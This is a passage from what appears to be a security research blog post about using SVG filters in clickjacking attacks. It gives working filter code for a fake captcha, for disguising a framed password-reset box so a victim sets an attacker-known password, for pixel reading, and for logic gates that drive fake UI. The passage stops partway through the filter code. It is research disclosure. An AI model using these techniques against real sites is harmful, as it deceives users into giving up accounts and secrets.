        result="turbulence" />
      <feDisplacementMap
        in="SourceGraphic"
        in2="turbulence"
        scale="6"
        xChannelSelector="R"
        yChannelSelector="G" />
    </filter>
</svg>
<style>
  body:has(#color-effects-hover) {
    /* whoops */
  }

  #fakeCaptcha {
    height:200px;
    position:relative;
    &>div {
      position:absolute;
      width:30%;
      height:100%;
      left:60%;
      top:0;
    }
    @media (width < 640px) {
      flex-direction: column;
      height: 400px;
      &>div {
        width:80%;
        height:50%;
        left:10%;
        top:50%;
      }
    }
    font-size: 16px;
    fake-frame {
      display: flex;
      flex-grow: 1;
      flex-direction: column;
      justify-content: center;
      text-align: center;
      p:nth-child(2) {
        font-size: 24px;
      }
    }
    &:not(:has(input:valid)) {
      .textB { display: none; }
    }
    &:has(input:valid) {
      .textA { display: none; }
    }
  }
  svg.effect {
    position: absolute;
    top: -9999px;
    left: -9999px;
  }
  fake-frame {
    width: calc(100% - 4px);
    display: block;
    overflow: auto;
    border: 2px inset #EEE;
    background: #FFF;
  }
</style>

*Note: Only the part inside the `<filter>` block is relevant, the rest is just an example of using filters.*

Add to this some <span id="color-effects-hover" style="/*text-decoration:underline*/">color effects and random lines</span>, and you've got a pretty convincing cap<span style="font-size:80%">-</span>tcha!

Out of all the attack primitives I'll be sharing, this one is probably the least useful as sites rarely allow you to frame pages giving out magic secret codes. I wanted to show it though, as it's a pretty simple introduction to the attack technique.

<style>
  .defSelect {
    &::selection, ::selection {
      background: #0041C6CC;
    }
  }
</style>
<DIV><art-frame class="defSelect" style="background:#121212;word-break:break-all;white-space:pre-wrap;font-family:monospace;color:#FFF;padding:8px;box-sizing:border-box" aria-label="an API response made to look like one from Google's services" role="figure">)]}'
[[1337],[1,"AIzaSyAtbm8sIHRoaXMgaXNuJ3QgcmVhbCBsb2w",0,"a",30],[768972,768973,768932,768984,768972,768969,768982,768969,768932,768958,768951],[105,1752133733,7958389,435644166009,7628901,32481100117144691,28526,28025,1651273575,15411]]</art-frame></DIV>

Still, it could come in handy because often times you're allowed to frame read-only API endpoints, so maybe there's an attack there to discover.

### Grey text hiding

The next example is for situations where you want to trick someone into, for example, interacting with a text input. Oftentimes the inputs have stuff like grey placeholder text in them, so showing the input box by itself won't cut it.

Let's take a look at our example target (try typing in the box).

<DIV><art-frame class="textExample" flex><fake-frame><div style="padding:0 16px"><p>Set a new p&ZeroWidthSpace;assword</p><input spellcheck=false placeholder="your new p&ZeroWidthSpace;assword" pattern=.{8,} ><span class="overlay">too short</span></div></fake-frame></art-frame></DIV>

<style>
  .textExample {
    height: 100px;
    width: 240px;
    font-size: 16px;
    fake-frame {
      div {
        position: relative;
      }
      input {
        border: 2px inset #777;
        background: #FFF;
        color: #222;
        font-family: inherit;
        font-size: inherit;
        width: 180px;
        position: absolute;
        top: 36px;
        height: 20px;
      }
      input::placeholder {
        opacity: 1;
        color: #999;
      }
      &:has(input:valid) {
        .overlay { display: none; }
      }
      .overlay {
        position: absolute;
        top: 36px;
        translate: calc(-100% + 182px) 4px;
        color: #F99;
        user-select: none;
        pointer-events: none;
      }
    }
  }
</style>

In this example we want to trick the user into setting an attacker-known password, so we want them to be able to see the text they're entering, but not the grey placeholder text, nor the red "too short" text.

Let's start off by using `feComposite` with arithmetics to make the grey text disappear. The `arithmetic` operation takes in two images, `i1` (`in=...`) and `i2` (`in2=...`), and lets us do per-pixel maths with `k1`, `k2`, `k3`, `k4` as the arguments according to this formula: <math><mi>r</mi><mo>=</mo><msub><mi>k</mi><mn>1</mn></msub><mo>⁢</mo><msub><mi>i</mi><mn>1</mn></msub><mo>⁢</mo><msub><mi>i</mi><mn>2</mn></msub><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mo>⁢</mo><msub><mi>i</mi><mn>1</mn></msub><mo>+</mo><msub><mi>k</mi><mn>3</mn></msub><mo>⁢</mo><msub><mi>i</mi><mn>2</mn></msub><mo>+</mo><msub><mi>k</mi><mn>4</mn></msub></math>[^math].


<DIV><art-frame class="textExample" flex><fake-frame style="filter:url(#textbox1)"><div style="padding:0 16px"><p>Set a new p&ZeroWidthSpace;assword</p><input pattern=.{8,} spellcheck=false placeholder="your new p&ZeroWidthSpace;assword" value="meow"><span class="overlay">too short</span></div></fake-frame></art-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v>
             <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>4</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<svg
  class="effect"
  width="768"
  height="768"
  viewBox="0 0 768 768"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="textbox1">
      <feComposite operator=arithmetic
                   k1=0 k2=4 k3=0 k4=0 />
    </filter>
</svg>

*Tip! You can leave out the in/in2 parameters if you just want it to be the previous output.*

It's getting there - by multiplying the brightness of the input we've made the grey text disappear, but now the black text looks a little suspicious and hard to read, especially on 1x scaling displays.

We *could* play around with the arguments to find the perfect balance between hiding the grey text and showing the black one, but ideally we'd still have the black text look the way usually does, just without any grey text. Is that possible?

So here's where a really cool technique comes into play - masking. We're going to create a matte to "cut out" the black text and cover up everything else. It's going to take us quite a few steps to get to the desired result, so lets go through it bit-by-bit.

We start off by cropping the result of our black text filter with `feTile`.

<DIV><art-frame class="textExample" flex><fake-frame style="filter:url(#textbox2)"><div style="padding:0 16px"><p>Set a new p&ZeroWidthSpace;assword</p><input pattern=.{8,} spellcheck=false placeholder="your new p&ZeroWidthSpace;assword" value="meow"><span class="overlay">too short</span></div></fake-frame></art-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>20</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>56</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>184</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>22</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<svg
  class="effect"
  width="768"
  height="768"
  viewBox="0 0 768 768"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="textbox2">
      <feComposite operator=arithmetic
                   k1=0 k2=4 k3=0 k4=0 />
      <feTile x=20 y=56 width=184 height=22 result="out" />
      <feFlood flood-color="#2d7961" />
      <feBlend in="out" />
    </filter>
</svg>

<p class="safariNote">Note: Safari seems to be having some trouble with <code>feTile</code>, so if <span>the examples flicker or look blank, read this post in a browser such as Firefox or Chrome. If</span> you're writing an attack for Safari, you can also achieve cropping by making a luma matte with <code>feFlood</code> and then applying it.</p>

Then we use `feMorphology` to increase the thickness of the text.

<DIV><art-frame class="textExample" flex><fake-frame style="filter:url(#textbox3)"><div style="padding:0 16px"><p>Set a new p&ZeroWidthSpace;assword</p><input pattern=.{8,} spellcheck=false placeholder="your new p&ZeroWidthSpace;assword" value="meow"><span class="overlay">too short</span></div></fake-frame></art-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feMorphology</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>erode</sx-v> <sx-r>radius</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<svg
  class="effect"
  width="768"
  height="768"
  viewBox="0 0 768 768"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="textbox3">
      <feComposite operator=arithmetic
                   k1=0 k2=4 k3=0 k4=0 />
      <feTile x=20 y=56 width=184 height=22 />
      <feMorphology operator=erode radius=3 result="out" />
      <feFlood flood-color="#2d7961" />
      <feBlend in="out"/>
    </filter>
</svg>

Now we have to increase the contrast of the mask. I'm going to do it by first using `feFlood` to create a solid white image, which we can then `feBlend` with `difference` to invert our mask. And then we can use `feComposite` to multiply[^multiply] the mask for better contrast.

<DIV><art-frame class="textExample" flex><fake-frame style="filter:url(#textbox4)"><div style="padding:0 16px"><p>Set a new p&ZeroWidthSpace;assword</p><input pattern=.{8,} spellcheck=false placeholder="your new p&ZeroWidthSpace;assword" value="meow"><span class="overlay">too short</span></div></fake-frame></art-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<svg
  class="effect"
  width="768"
  height="768"
  viewBox="0 0 768 768"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="textbox4">
      <feComposite operator=arithmetic
                   k1=0 k2=4 k3=0 k4=0 />
      <feTile x=20 y=56 width=184 height=22 />
      <feMorphology operator=erode radius=3 result=thick />
      <feFlood flood-color=#FFF result=white />
      <feBlend mode=difference in=thick in2=white />
      <feComposite operator=arithmetic k2=100 result=out />
      <feFlood flood-color="#2d7961" />
      <feBlend in="out"/>
    </filter>
</svg>

We have a luma matte now! All that's left is to convert it into an alpha matte with `feColorMatrix`, apply it to the source image with `feComposite`, and make the background white with `feBlend`.

<DIV><art-frame class="textExample" flex><fake-frame style="filter:url(#textbox5)"><div style="padding:0 16px"><p>Set a new p&ZeroWidthSpace;assword</p><input pattern=.{8,} spellcheck=false placeholder="your new p&ZeroWidthSpace;assword" value="meow"><span class="overlay">too short</span></div></fake-frame></art-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
        <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0
                0 0 0 0 0
                0 0 0 0 0
                0 0 1 0 0&quot;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<svg
  class="effect"
  width="768"
  height="768"
  viewBox="0 0 768 768"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="textbox5">
      <feComposite operator=arithmetic
                   k1=0 k2=4 k3=0 k4=0 />
      <feTile x=20 y=56 width=184 height=22 />
      <feMorphology operator=erode radius=3 result=thick />
      <feFlood flood-color=#FFF result=white />
      <feBlend mode=difference in=thick in2=white />
      <feComposite operator=arithmetic k2=100 />
      <feColorMatrix type=matrix
          values="0 0 0 0 0
                  0 0 0 0 0
                  0 0 0 0 0
                  0 0 1 0 0" />
      <feComposite in=SourceGraphic
                   operator=in />
      <feBlend in2=white />
    </filter>
</svg>

Looks pretty good, doesn't it! If you empty out the box (try it!) you might notice some artifacts that give away what we've done, but apart from that it's a pretty good way to sort of sculpt and form various inputs around a bit for an attack.

There are all sorts of other effects you can add to make the input seem just right. Let's combine everything together into a complete example of an attack.

<DIV><art-frame class="textExample" flex><fake-frame style="filter:url(#textbox6)"><div style="padding:0 16px"><p>Set a new p&ZeroWidthSpace;assword</p><input pattern=.{8,} spellcheck=false placeholder="your new p&ZeroWidthSpace;assword" value="meow"><span class="overlay">too short</span></div></fake-frame><div class=attack style="top: 23px;left: 18px;color:#FFF">Enter your e-mail address:</div><div class=attack style="top:55px;left:17px;width:182px;height:20px;border:1px solid #444;border-radius:4px;pointer-events:none;box-shadow: 0 0px 10px 0 #000 inset;"></div></art-frame></DIV>

<style>
  art-frame.textExample {
    &:has(.attack) {
      position: relative;
    }
    .attack {
      position: absolute;
    }
  }
</style>

<pre class="sx-block"><code><sx-t>&lt;filter&gt;
  &lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v>
               <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>4</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-t>/&gt;
  &lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>20</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>56</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>184</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>22</sx-v> <sx-t>/&gt;
  &lt;feMorphology</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>erode</sx-v> <sx-r>radius</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-t>/&gt;
  &lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-t>/&gt;
  &lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
      <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0
              0 0 0 0 0
              0 0 0 0 0
              0 0 1 0 0&quot;</sx-v> <sx-t>/&gt;
  &lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
  &lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>21</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>57</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>182</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>20</sx-v> <sx-t>/&gt;
  &lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>0.02</sx-v> <sx-t>/&gt;
&lt;/filter&gt;</sx-t>
</code></pre>

<svg
  class="effect"
  width="768"
  height="768"
  viewBox="0 0 768 768"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="textbox6">
      <feComposite operator=arithmetic
                   k1=0 k2=4 k3=0 k4=0 />
      <feTile x=20 y=56 width=184 height=22 />
      <feMorphology operator=erode radius=3 result=thick />
      <feFlood flood-color=#FFF result=white />
      <feBlend mode=difference in=thick in2=white />
      <feComposite operator=arithmetic k2=100 />
      <feColorMatrix type=matrix
          values="0 0 0 0 0
                  0 0 0 0 0
                  0 0 0 0 0
                  0 0 1 0 0" />
      <feComposite in=SourceGraphic
                   operator=in />
      <feTile x=21 y=57 width=182 height=20 />
      <feBlend in2=white />
      <feBlend mode=difference in2=white />
      <feComposite operator=arithmetic k2=1 k4=0.02 />
    </filter>
</svg>

You can see how the textbox is entirely recontextualized now to fit a different design while still being fully functional.

### Pixel reading

And now we come to what is most likely the most useful attack primitive - pixel reading. That's right, you can use SVG filters to read color data off of images and perform all sorts of logic on them to create really advanced and convincing attacks.

The catch is of course, that you'll have to do everything within SVG filters - there is no way to get the data out[^dataout]. Despite that, it is very powerful if you get creative with it.

On a higher level, what this lets us do is make everything in a clickjacking attack responsive - fake buttons can have hover effects, pressing them can show fake dropdowns and dialogs, and we can even have fake form validation.

Let's start off with a simple example - detecting if a pixel is pure black, and using it to turn another filter on or off.

<style>
  .pix-read-demo {
    --off: #000;
    --on: radial-gradient(#BCC,#9AA);
    &.pix-pride {
      --off: linear-gradient(#5BCFFA 20%,#F5AAB9 20%,#F5AAB9 40%,#FFF 40%, #FFF 60%, #F5AAB9 60%, #F5AAB9 80%, #5BCFFA 80%);
      --on: linear-gradient(#D52800 20%,#FD9954 20%,#FD9954 40%,#FFF 40%, #FFF 60%, #D261A3 60%, #D261A3 80%, #A30061 80%);
    }
    background: #b9fff6;
    position: relative;
    padding: 16px;
    width: 420px;
    max-width: 100%;
    overflow: clip;
    box-sizing: border-box;
    height: 100px;
    border-color: #9ed;
    p {
      margin-left: 70px;
    }
    label {
      display: block;
      width: 64px;
      height: 64px;
      position: absolute;
      top: 16px;
      left: 16px;
      cursor: pointer;
      background: var(--off);
    }
  }
  html:has(#pixread:checked) {
    .pix-read-demo label {
      background: var(--on);
    }
  }
</style>

<input type=checkbox id=pixread style="display:none">

<DIV><fake-frame class="pix-read-demo">
  <label for=pixread></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame></DIV>

For this target, we want to detect when the user clicks on the box to change its color, and use that to toggle a blur effect.

<div class="safariNote"><span>All the examples from here onwards are broken on Safari. Use Firefox or Chrome if you don't see them.</span></div>

<svg
  class="effect"
  width="420"
  height="100"
  viewBox="0 0 420 100"
  xmlns="http://www.w3.org/2000/svg">
    <filter id=pix1>
      <feTile x="50" y="50"
          width="4" height="4" />
      <feTile x="0" y="0"
          width="100%" height="100%" />
    </filter>
    <filter id=pix2>
      <feTile x="50" y="50"
          width="4" height="4" />
      <feTile x="0" y="0"
          width="100%" height="100%" />
      <feComposite operator=arithmetic k2=100 />
    </filter>
    <filter id=pix3>
      <feTile x="50" y="50"
          width="4" height="4" />
      <feTile x="0" y="0"
          width="100%" height="100%" />
      <feComposite operator=arithmetic k2=100 />
      <feColorMatrix type=matrix
        values="0 0 0 0 0
                0 0 0 0 0
                0 0 0 0 0
                0 0 1 0 0" result=mask />
      <feGaussianBlur stdDeviation=3
          in=SourceGraphic />
      <feComposite operator=in in2=mask />
      <feBlend in2=SourceGraphic />
    </filter>
    <filter id=pix4>
      <!-- crop to first stripe of the flag -->
      <feTile x="22" y="22"
          width="4" height="4" />
      <feTile x="0" y="0" result="col"
          width="100%" height="100%" />
      <!-- generate a color to diff against -->
      <feFlood flood-color="#5BCFFA"
               result="blue" />
      <feBlend mode="difference"
               in="col" in2="blue" />
      <!-- k4 is for more lenient threshold -->
      <feComposite operator=arithmetic
                   k2=100 k4=-5 />
      <feColorMatrix type=matrix
        values="0 0 0 0 0
                0 0 0 0 0
                0 0 0 0 0
                0 0 1 0 0" result=mask />
      <feGaussianBlur stdDeviation=3
          in=SourceGraphic />
      <feComposite operator=in in2=mask />
      <feBlend in2=SourceGraphic />
    </filter>
</svg>


<DIV><fake-frame class="pix-read-demo" style="filter:url(#pix1)">
  <label for=pixread></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;50&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;50&quot;</sx-v>
        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v>
        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

Let's start off by using two copies of the `feTile` filter to first crop out the few pixels we're interested in and then tile those pixels across the entire image.

The result is that we now have the entire screen filled with the color of the area we are interested in.

<DIV><fake-frame class="pix-read-demo" style="filter:url(#pix2)">
  <label for=pixread></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

We can turn this result into a binary on/off value by using `feComposite`'s arithmetic the same way as in the last section, but with a way larger `k2` value. This makes it so that the output image is either completely black or completely white.

<DIV><fake-frame class="pix-read-demo" style="filter:url(#pix3)">
  <label for=pixread></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame></DIV>

<pre class="sx-block"><code><sx-t>&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
  <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&quot;0 0 0 0 0
          0 0 0 0 0
          0 0 0 0 0
          0 0 1 0 0&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>mask</sx-v> <sx-t>/&gt;
&lt;feGaussianBlur</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v>
                <sx-r>stdDeviation</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>mask</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

And just as before, this can be used as a mask. We once again convert it into an alpha matte, but this time apply it to the blur filter.

So that's how you can find out whether a pixel is black and use that to toggle a filter!

<DIV><fake-frame class="pix-read-demo pix-pride">
  <label for=pixread></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame></DIV>

Uh oh! It seems that somebody has changed the target to have a pride-themed button instead!

How can we adapt this technique to work with arbitrary colors and textures?

<DIV><fake-frame class="pix-read-demo pix-pride" style="filter:url(#pix4)">
  <label for=pixread></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame></DIV>

<pre class="sx-block"><code><sx-c>&lt;!-- crop to first stripe of the flag --&gt;</sx-c>
<sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;22&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;22&quot;</sx-v>
        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;4&quot;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&quot;0&quot;</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&quot;col&quot;</sx-v>
        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&quot;100%&quot;</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- generate a color to diff against --&gt;</sx-c>
<sx-t>&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>&quot;#5BCFFA&quot;</sx-v>
         <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&quot;blue&quot;</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>&quot;difference&quot;</sx-v>
         <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>&quot;col&quot;</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>&quot;blue&quot;</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- k4 is for more lenient threshold --&gt;</sx-c>
<sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v>
             <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>-5</sx-v> <sx-t>/&gt;</sx-t>
<sx-c>&lt;!-- do the masking and blur stuff... --&gt;</sx-c>
...
</code></pre>

The solution is pretty simple - we can simply use `feBlend`'s difference combined with a `feColorMatrix` to join the color channels to turn the image into a similar black/white matte as before. For textures we can use `feImage`, and for non-exact colors we can use a bit of `feComposite`'s arithmetic to make the matching threshold more lenient.

And that's it, a simple example of how we can read a pixel value and use it to toggle a filter.

<!--On a higher level, what we can do is detect the color of arbitrary pixels and render our own fake ui accordingly.-->

### Logic gates

<!-- example: a button has hover effects, pressing it opens a modal that dims the background, the modal requires us to ... -->

But here's the part where it gets fun! We can repeat the pixel-reading process to read out multiple pixels, and then run logic on them to program an attack.

By using `feBlend` and `feComposite`, we can recreate all logic gates and make SVG filters [functionally complete](https://en.wikipedia.org/wiki/Functional_completeness). This means that we can program anything we want, as long as it is not timing-based[^time-based] and doesn't take up too many resources[^toomresources].

<div id="logic-gates-outer">
<div id="logic-gates-box">
  <div>
    <label><input type="checkbox" name="logic1">Input A</label>
    <label><input type="checkbox" name="logic2">Input B</label>
  </div>
  <p>Input: <logic-gate></logic-gate></p>
  <p>&nbsp;&nbsp;NOT: <logic-gate style="filter:url(#logic-not)"></logic-gate>
    <br><code>&lt;feBlend mode=difference in2=white /&gt;</code></p>
  <p>&nbsp;&nbsp;AND: <logic-gate style="filter:url(#logic-and)"></logic-gate>
    <br><code>&lt;feComposite operator=arithmetic k1=1 /&gt;</code></p>
  <p>&nbsp;&nbsp;&nbsp;OR: <logic-gate style="filter:url(#logic-or)"></logic-gate>
    <br><code>&lt;feComposite operator=arithmetic k2=1 k3=1 /&gt;</code></p>
  <p>&nbsp;&nbsp;XOR: <logic-gate style="filter:url(#logic-xor)"></logic-gate>
    <br><code>&lt;feBlend mode=difference in=a in2=b /&gt;</code></p>
  <p>&nbsp;NAND: <logic-gate style="filter:url(#logic-and) url(#logic-not)"></logic-gate>
    <br><code>(AND + NOT)</code></p>
  <p>&nbsp;&nbsp;NOR: <logic-gate style="filter:url(#logic-or) url(#logic-not)"></logic-gate>
    <br><code>(OR + NOT)</code></p>
  <p>&nbsp;XNOR: <logic-gate style="filter:url(#logic-xor) url(#logic-not)"></logic-gate>
    <br><code>(XOR + NOT)</code></p>
</div>
</div>

<style>
  logic-gate {
    display: inline-block;
    vertical-align: middle;
    width: 64px;
    height: 32px;
    --inA: #000;
    --inB: #000;
    clip-path: rect(0% 100% 100% 0%);
    background: linear-gradient(90deg, var(--inA) 50%, var(--inB) 50%);
    margin: 4px;
    margin-right: 24px;
  }

  #logic-gates-outer, #calculator-outer {
    display: flex;
    justify-content: center;
    background: #b3b3b3;
    border: 1px inset #EEE;
    padding: 16px 0;
    box-sizing: border-box;
  }

  #logic-gates-box, #calculator-box {
    label {
      -webkit-user-select: none;
      user-select: none;
    }
    text-align: center;
    background: #b3b3b3;
    max-width: fit-content;
    & > p {
      font-family: var(--font-code);
      border: 1px outset #EEE;
      background: #C0C0C0;
      color: #000;
      font-weight: 600;
      padding: 6px;
      margin: 4px;
      text-align: center;
      code {
        font-family: var(--font-mono);
        color: #04593b;
      }
    }
  }
  #logic-gates-box:has([name="logic1"]:checked) logic-gate { --inA: #FFF; }
  #logic-gates-box:has([name="logic2"]:checked) logic-gate { --inB: #FFF; }
</style>

<svg
  class="effect"
  width="64"
  height="32"
  viewBox="0 0 64 32"
  xmlns="http://www.w3.org/2000/svg">
    <filter id="logic-not">
      <!-- util -->
      <feTile x="25%" y="50%" width="4" height="4" />
      <feTile x="0" y="0" width="100%" height="100%" result=a />
      <feTile x="75%" y="50%" width="4" height="4" in=SourceGraphic />
      <feTile x="0" y="0" width="100%" height="100%" result=b />
      <feFlood flood-color=#FFF result=white />
      <!-- logic -->
      <feBlend mode=difference in=a in2=white />
    </filter>
    <filter id="logic-and">
      <!-- util -->
      <feTile x="25%" y="50%" width="4" height="4" />
      <feTile x="0" y="0" width="100%" height="100%" result=a />
      <feTile x="75%" y="50%" width="4" height="4" in=SourceGraphic />
      <feTile x="0" y="0" width="100%" height="100%" result=b />
      <!-- logic -->
      <feComposite operator=arithmetic k1=1 in=a in2=b />
    </filter>
    <filter id="logic-or">
      <!-- util -->
      <feTile x="25%" y="50%" width="4" height="4" />
